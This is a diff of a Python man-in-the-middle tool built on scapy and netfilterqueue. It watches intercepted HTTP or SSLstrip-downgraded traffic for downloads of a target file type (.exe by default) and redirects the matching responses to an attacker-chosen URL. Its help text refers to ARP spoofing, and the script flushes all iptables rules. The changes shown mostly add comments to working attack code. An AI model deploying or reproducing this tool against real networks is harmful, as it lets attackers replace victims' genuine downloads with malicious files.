@@ -7,38 +7,46 @@ import argparse
 import os
 from termcolor import cprint
 
-
 MY_IP = get_if_addr(conf.iface) #IP of DEFAULT INTERFACE
 TARGET = '.exe' #DEFAULT TARGET
-ack_list = []
-URL = 'https://www.google.com'
+ack_list = [] #List of all requested ACKs
+URL = 'https://www.google.com' #DEFAULT redirection URL
+PORT = 80 #PORT for detection of packets (80 HTTP, 10000 HTTPS with SSLstrip)
 LINE = '____________________________________________________________'
-PORT = 0
 
-#Process each packet
+
+'''
+Process each packet on Network filter queue
+'''
 def process_packet(packet):
     global ack_list, TARGET, URL, PORT
+    
+    #Convertion of filtered packet to scapy IP packet
     IP_pkt = IP(packet.get_payload())
     
+    #Check if the packet has Raw and TCP layer
     if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
+        
+        #Request from client to server 
         if IP_pkt[TCP].dport == PORT:
             cprint('Request', 'red', attrs=['bold',], end='')
 
-            #Request of download a program
+            #Request of downloading a file with extension TARGET
             if TARGET in str(IP_pkt[Raw].load):
                 cprint(': ', 'red', attrs=['bold',], end='')
                 cprint(f'{TARGET} ', 'cyan', attrs=['bold',], end='')
                 print('file with GET method ---> ', end='')
                 cprint(f'{URL} ', 'yellow', attrs=['bold',])
+                #Append requested ACK 
                 ack_list.append(IP_pkt[TCP].ack)
             else:
                 print('')
 
-
+        #Response from server to client
         elif IP_pkt[TCP].sport == PORT:
             cprint('Response', 'blue', attrs=['bold',])
 
-            #Is it response seq in ack list
+            #Response sequence number is in requested ACK list
             if IP_pkt[TCP].seq in ack_list:
                 #Remove corresponding ACK in the list
                 ack_list.remove(IP_pkt[TCP].seq)
@@ -54,11 +62,15 @@ def process_packet(packet):
     packet.accept()
 
 
-#Parser of command line argument
+'''
+Parser of command line argument
+'''
 def args_parser():
     global MY_IP, TARGET, URL
+    
     #Parser of command line arguments
     parser = argparse.ArgumentParser()
+    
     #Initialization of needed arguments
     parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
     parser.add_argument("-interface", "-i", dest="interface", help="Name of the network interface of your machine")
@@ -82,9 +94,12 @@ def args_parser():
     return args.local, args.https
 
 
-
+'''
+Main function
+'''
 def main():
     global PORT
+    #Parser of command line arguments
     local, https = args_parser()
 
     #Packets are blocked and not forwarded
@@ -102,9 +117,6 @@ def main():
 
     if https:
         PORT = 10000
-    else:
-        PORT = 80
-
 
     #O = queue num
     queue = netfilterqueue.NetfilterQueue()
@@ -119,6 +131,7 @@ def main():
         print('Flushing ip table.', end='\n')
         cprint(f'{LINE}','green', attrs=['bold',], end='\n\n')
         os.system('iptables -F')
+
 
 if __name__=='__main__':
 	main()
